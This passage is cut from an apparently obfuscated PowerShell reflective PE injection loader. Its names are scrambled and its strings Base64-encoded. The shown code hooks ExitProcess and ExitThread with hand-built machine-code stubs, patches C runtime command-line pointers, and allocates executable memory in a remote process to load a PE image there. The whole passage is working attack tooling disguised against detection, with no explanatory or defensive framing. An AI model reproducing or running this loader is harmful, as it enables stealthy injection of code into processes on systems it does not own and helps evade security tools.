		${_/\/\__/\___/\___} = $Win32Functions.VirtualProtect.Invoke(${/========\___/\/=}, [UInt32]${_/\/\_/====\__/=\}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${___/\/\/=\/\_/\/\})
		if (${_/\/\__/\___/\___} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${/===\/=\/=\/=\/==} = ${/========\___/\/=}
		__/\_/====\/==\/\_ -____/\___/\/===\/= ${__/=\/\/\__/\__/=} -___/==\/=\_/\_/\/\ ${/===\/=\/=\/=\/==}
		${/===\/=\/=\/=\/==} = _/=\/=\_/\/=\_/=== ${/===\/=\/=\/=\/==} (${__/=\/\/\__/\__/=}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\__/\_/\/\/\/\_}, ${/===\/=\/=\/=\/==}, $false)
		${/===\/=\/=\/=\/==} = _/=\/=\_/\/=\_/=== ${/===\/=\/=\/=\/==} ${_/=\/==\____/==\_}
		__/\_/====\/==\/\_ -____/\___/\/===\/= ${_/=\/\__/\__/\__/} -___/==\/=\_/\_/\/\ ${/===\/=\/=\/=\/==}
		$Win32Functions.VirtualProtect.Invoke(${/========\___/\/=}, [UInt32]${_/\/\_/====\__/=\}, [UInt32]${___/\/\/=\/\_/\/\}, [Ref]${___/\/\/=\/\_/\/\}) | Out-Null
		${/==\/\/\__/=\____} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach (${_/\__/======\____} in ${/==\/\/\__/=\____})
		{
			[IntPtr]${/=\/=\/=\/==\/==\} = $Win32Functions.GetModuleHandle.Invoke(${_/\__/======\____})
			if (${/=\/=\/=\/==\/==\} -ne [IntPtr]::Zero)
			{
				[IntPtr]${___/======\/\__/=} = $Win32Functions.GetProcAddress.Invoke(${/=\/=\/=\/==\/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]${_/\/\_/\/==\_/\/\} = $Win32Functions.GetProcAddress.Invoke(${/=\/=\/=\/==\/==\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if (${___/======\/\__/=} -eq [IntPtr]::Zero -or ${_/\/\_/\/==\_/\/\} -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${__/==\/\/==\/=\/\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${___/=\__/==\__/\__})
				${_/==\_/\/=====\/\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${___/=\__/==\__/\__})
				${/===\/\________/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/\_/\/==\_/\/\}, [Type][IntPtr])
				${______/\/======\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${___/======\/\__/=}, [Type][IntPtr])
				${______/\/===\/\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\/==\____/==\_})
				${_/=\_/\/\/=\/\_/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\/==\____/==\_})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/===\/\________/\}, ${______/\/===\/\/=}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${______/\/======\/}, ${_/=\_/\/\/=\/\_/=}, $false)
				${/==\__/\____/=\/=} += ,(${_/\/\_/\/==\_/\/\}, ${______/\/===\/\/=}, ${_/=\/==\____/==\_})
				${/==\__/\____/=\/=} += ,(${___/======\/\__/=}, ${_/=\_/\/\/=\/\_/=}, ${_/=\/==\____/==\_})
				${_/\/\__/\___/\___} = $Win32Functions.VirtualProtect.Invoke(${_/\/\_/\/==\_/\/\}, [UInt32]${_/=\/==\____/==\_}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${___/\/\/=\/\_/\/\})
				if (${_/\/\__/\___/\___} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/==\/\/==\/=\/\}, ${_/\/\_/\/==\_/\/\}, $false)
				$Win32Functions.VirtualProtect.Invoke(${_/\/\_/\/==\_/\/\}, [UInt32]${_/=\/==\____/==\_}, [UInt32](${___/\/\/=\/\_/\/\}), [Ref]${___/\/\/=\/\_/\/\}) | Out-Null
				${_/\/\__/\___/\___} = $Win32Functions.VirtualProtect.Invoke(${___/======\/\__/=}, [UInt32]${_/=\/==\____/==\_}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${___/\/\/=\/\_/\/\})
				if (${_/\/\__/\___/\___} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/==\_/\/=====\/\}, ${___/======\/\__/=}, $false)
				$Win32Functions.VirtualProtect.Invoke(${___/======\/\__/=}, [UInt32]${_/=\/==\____/==\_}, [UInt32](${___/\/\/=\/\_/\/\}), [Ref]${___/\/\/=\/\_/\/\}) | Out-Null
			}
		}
		${/==\__/\____/=\/=} = @()
		${_/=\/\__/\_/==\__} = @() 
		[IntPtr]${/=\/=\__/\__/===\} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if (${/=\/=\__/\__/===\} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]${/=\/\/\_/=\/====\} = $Win32Functions.GetProcAddress.Invoke(${/=\/=\__/\__/===\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${/=\/\/\_/=\/====\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${_/=\/\__/\_/==\__} += ${/=\/\/\_/=\/====\}
		[IntPtr]${__/\__/=\___/=\/\} = $Win32Functions.GetProcAddress.Invoke(${/=\_/===\/==\_/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${__/\__/=\___/=\/\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${_/=\/\__/\_/==\__} += ${__/\__/=\___/=\/\}
		[UInt32]${___/\/\/=\/\_/\/\} = 0
		foreach (${_/\/\___/===\___/} in ${_/=\/\__/\_/==\__})
		{
			${/\______/=\____/\} = ${_/\/\___/===\___/}
			[Byte[]]${__/=\/\/\__/\__/=} = @(0xbb)
			[Byte[]]${_/=\/\__/\__/\__/} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${_/=\/==\____/==\_} -eq 8)
			{
				[Byte[]]${__/=\/\/\__/\__/=} = @(0x48, 0xbb)
				[Byte[]]${_/=\/\__/\__/\__/} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${/==\_/\/\__/===\_} = @(0xff, 0xd3)
			${_/\/\_/====\__/=\} = ${__/=\/\/\__/\__/=}.Length + ${_/=\/==\____/==\_} + ${_/=\/\__/\__/\__/}.Length + ${_/=\/==\____/==\_} + ${/==\_/\/\__/===\_}.Length
			[IntPtr]${/=\/=\/\__/==\_/=} = $Win32Functions.GetProcAddress.Invoke(${/=\_/===\/==\_/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if (${/=\/=\/\__/==\_/=} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${_/\/\__/\___/\___} = $Win32Functions.VirtualProtect.Invoke(${_/\/\___/===\___/}, [UInt32]${_/\/\_/====\__/=\}, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${___/\/\/=\/\_/\/\})
			if (${_/\/\__/\___/\___} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${__/=\/\/\/=\____/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/\/\_/====\__/=\})
			$Win32Functions.memcpy.Invoke(${__/=\/\/\/=\____/}, ${_/\/\___/===\___/}, [UInt64]${_/\/\_/====\__/=\}) | Out-Null
			${/==\__/\____/=\/=} += ,(${_/\/\___/===\___/}, ${__/=\/\/\/=\____/}, ${_/\/\_/====\__/=\})
			__/\_/====\/==\/\_ -____/\___/\/===\/= ${__/=\/\/\__/\__/=} -___/==\/=\_/\_/\/\ ${/\______/=\____/\}
			${/\______/=\____/\} = _/=\/=\_/\/=\_/=== ${/\______/=\____/\} (${__/=\/\/\__/\__/=}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/\/\/==\/===\/=}, ${/\______/=\____/\}, $false)
			${/\______/=\____/\} = _/=\/=\_/\/=\_/=== ${/\______/=\____/\} ${_/=\/==\____/==\_}
			__/\_/====\/==\/\_ -____/\___/\/===\/= ${_/=\/\__/\__/\__/} -___/==\/=\_/\_/\/\ ${/\______/=\____/\}
			${/\______/=\____/\} = _/=\/=\_/\/=\_/=== ${/\______/=\____/\} (${_/=\/\__/\__/\__/}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\/=\/\__/==\_/=}, ${/\______/=\____/\}, $false)
			${/\______/=\____/\} = _/=\/=\_/\/=\_/=== ${/\______/=\____/\} ${_/=\/==\____/==\_}
			__/\_/====\/==\/\_ -____/\___/\/===\/= ${/==\_/\/\__/===\_} -___/==\/=\_/\_/\/\ ${/\______/=\____/\}
			$Win32Functions.VirtualProtect.Invoke(${_/\/\___/===\___/}, [UInt32]${_/\/\_/====\__/=\}, [UInt32]${___/\/\/=\/\_/\/\}, [Ref]${___/\/\/=\/\_/\/\}) | Out-Null
		}
		echo ${/==\__/\____/=\/=}
	}
	Function __/=\/\/======\___
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${_/===\/\/=\/====\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]${___/\/\/=\/\_/\/\} = 0
		foreach (${/=\/\/====\_/\/\_} in ${_/===\/\/=\/====\_})
		{
			${_/\/\__/\___/\___} = $Win32Functions.VirtualProtect.Invoke(${/=\/\/====\_/\/\_}[0], [UInt32]${/=\/\/====\_/\/\_}[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${___/\/\/=\/\_/\/\})
			if (${_/\/\__/\___/\___} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			$Win32Functions.memcpy.Invoke(${/=\/\/====\_/\/\_}[0], ${/=\/\/====\_/\/\_}[1], [UInt64]${/=\/\/====\_/\/\_}[2]) | Out-Null
			$Win32Functions.VirtualProtect.Invoke(${/=\/\/====\_/\/\_}[0], [UInt32]${/=\/\/====\_/\/\_}[2], [UInt32]${___/\/\/=\/\_/\/\}, [Ref]${___/\/\/=\/\_/\/\}) | Out-Null
		}
	}
	Function ___/=\___/\/=\__/=
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/\/\/\_/\/=\/=\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${__/\___/\__/\__/=\}
		)
		$Win32Types = __/\_/==\__/\/==\/
		$Win32Constants = ___/====\_/\/==\/\
		${__/\/\_/\__/\___/=} = _/==\_/=\/\/=\/==\ -__/\/\/\_/\/=\/=\_ ${__/\/\/\_/\/=\/=\_} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${_/\/=\/===\/\_/\/} = _/=\/=\_/\/=\_/=== (${__/\/\/\_/\/=\/=\_}) (${__/\/\_/\__/\___/=}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${____/==\/==\__/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/=\/===\/\_/\/}, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		for (${/===\_/==\_/\/===} = 0; ${/===\_/==\_/\/===} -lt ${____/==\/==\__/\/}.NumberOfNames; ${/===\_/==\_/\/===}++)
		{
			${/==\/\/\/=\/\/\_/} = _/=\/=\_/\/=\_/=== (${__/\/\/\_/\/=\/=\_}) (${____/==\/==\__/\/}.AddressOfNames + (${/===\_/==\_/\/===} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${/=========\/\____} = _/=\/=\_/\/=\_/=== (${__/\/\/\_/\/=\/=\_}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\/\/\/=\/\/\_/}, [Type][UInt32]))
			${_/==\/\___/\_/=\/} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${/=========\/\____})
			if (${_/==\/\___/\_/=\/} -ceq ${__/\___/\__/\__/=\})
			{
				${_/==\_/\/\/===\__} = _/=\/=\_/\/=\_/=== (${__/\/\/\_/\/=\/=\_}) (${____/==\/==\__/\/}.AddressOfNameOrdinals + (${/===\_/==\_/\/===} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${___/=\__/\_/=====} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/==\_/\/\/===\__}, [Type][UInt16])
				${__/========\_____} = _/=\/=\_/\/=\_/=== (${__/\/\/\_/\/=\/=\_}) (${____/==\/==\__/\/}.AddressOfFunctions + (${___/=\__/\_/=====} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${__/====\_____/\/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/========\_____}, [Type][UInt32])
				return _/=\/=\_/\/=\_/=== (${__/\/\/\_/\/=\/=\_}) (${__/====\_____/\/=})
			}
		}
		return [IntPtr]::Zero
	}
	Function __/\__/\_/\____/==
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${_/=\_/\/\/=\___/=\},
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		${__/\___/\__/===\_/},
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${_/==\_/\/=\/=\/=\_}
		)
		${_/=\/==\____/==\_} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$Win32Constants = ___/====\_/\/==\/\
		$Win32Functions = _/=\_/=\/\/\/=\/\/
		$Win32Types = __/\_/==\__/\/==\/
		${/=\__/=\/==\__/==} = $false
		if ((${_/==\_/\/=\/=\/=\_} -ne $null) -and (${_/==\_/\/=\/=\/=\_} -ne [IntPtr]::Zero))
		{
			${/=\__/=\/==\__/==} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${__/\/\_/\__/\___/=} = ____/\/\/\___/==== -_/=\_/\/\/=\___/=\ ${_/=\_/\/\/=\___/=\} -Win32Types $Win32Types
		${_/=\_/\/\/\/=\__/\} = ${__/\/\_/\__/\___/=}.OriginalImageBase
		${___/=\/=\____/=\_} = $true
		if (([Int] ${__/\/\_/\__/\___/=}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${___/=\/=\____/=\_} = $false
		}
		${/====\/\__/\_/==\} = $true
		if (${/=\__/=\/==\__/==} -eq $true)
		{
			${/=\_/===\/==\_/==} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${/====\___/\/=\/==} = $Win32Functions.GetProcAddress.Invoke(${/=\_/===\/==\_/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${/====\___/\/=\/==} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]${___/\/\/=\_/====\} = $false
			${_/\/\__/\___/\___} = $Win32Functions.IsWow64Process.Invoke(${_/==\_/\/=\/=\/=\_}, [Ref]${___/\/\/=\_/====\})
			if (${_/\/\__/\___/\___} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if ((${___/\/\/=\_/====\} -eq $true) -or ((${___/\/\/=\_/====\} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${/====\/\__/\_/==\} = $false
			}
			${__/=\/==\/\/\_/=\} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${__/=\/==\/\/\_/=\} = $false
			}
			if (${__/=\/==\/\/\_/=\} -ne ${/====\/\__/\_/==\})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${/====\/\__/\_/==\} = $false
			}
		}
		if (${/====\/\__/\_/==\} -ne ${__/\/\_/\__/\___/=}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]${/===\/\/=\______/} = [IntPtr]::Zero
		if (([Int] ${__/\/\_/\__/\___/=}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuAA=='))) -WarningAction Continue
			[IntPtr]${/===\/\/=\______/} = ${_/=\_/\/\/\/=\__/\}
		}
		${__/\/\/\_/\/=\/=\_} = [IntPtr]::Zero				
		${/====\_/\/=\_/==\} = [IntPtr]::Zero		
		if (${/=\__/=\/==\__/==} -eq $true)
		{
			${__/\/\/\_/\/=\/=\_} = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${__/\/\_/\__/\___/=}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			${/====\_/\/=\_/==\} = $Win32Functions.VirtualAllocEx.Invoke(${_/==\_/\/=\/=\/=\_}, ${/===\/\/=\______/}, [UIntPtr]${__/\/\_/\__/\___/=}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${/====\_/\/=\_/==\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${___/=\/=\____/=\_} -eq $true)
			{
				${__/\/\/\_/\/=\/=\_} = $Win32Functions.VirtualAlloc.Invoke(${/===\/\/=\______/}, [UIntPtr]${__/\/\_/\__/\___/=}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				${__/\/\/\_/\/=\/=\_} = $Win32Functions.VirtualAlloc.Invoke(${/===\/\/=\______/}, [UIntPtr]${__/\/\_/\__/\___/=}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			${/====\_/\/=\_/==\} = ${__/\/\/\_/\/=\/=\_}
		}
		[IntPtr]${_/=\/==\_/\/\/=\/} = _/=\/=\_/\/=\_/=== (${__/\/\/\_/\/=\/=\_}) ([Int64]${__/\/\_/\__/\___/=}.SizeOfImage)
		if (${__/\/\/\_/\/=\/=\_} -eq [IntPtr]::Zero)
		{ 
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy(${_/=\_/\/\/=\___/=\}, 0, ${__/\/\/\_/\/=\/=\_}, ${__/\/\_/\__/\___/=}.SizeOfHeaders) | Out-Null
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${__/\/\_/\__/\___/=} = _/==\_/=\/\/=\/==\ -__/\/\/\_/\/=\/=\_ ${__/\/\/\_/\/=\/=\_} -Win32Types $Win32Types -Win32Constants $Win32Constants
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${_/=\/==\_/\/\/=\/}
		${__/\/\_/\__/\___/=} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${/====\_/\/=\_/==\}
